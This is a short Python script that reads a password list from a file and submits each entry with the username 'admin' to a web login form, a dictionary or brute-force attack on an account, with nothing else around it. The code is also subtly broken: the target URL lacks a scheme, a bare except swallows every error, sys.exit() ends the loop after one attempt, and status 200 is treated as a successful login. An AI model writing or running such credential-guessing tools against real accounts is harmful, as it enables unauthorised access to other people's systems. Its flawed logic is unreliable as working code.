import requests, sys

with open('passwords.txt', 'r') as file:
    passwords= file.read().split('\n')
    # passwords1, passwords2, passwords3, passwords4 = numpy.array_split(passwords, 4)
    # print(passwords1, passwords2, passwords3, passwords4)    
    # print(passwords)

    

    for passwd in passwords:
        try:
            r = requests.post(url= 'google.com', data= {'username': 'admin', 'password': passwd})
            print(r.text)
            if r.status_code == 200:
                print(f'{passwd}')
                break
            sys.exit()
        except:
            print('Login Attempt Has Failed')
        
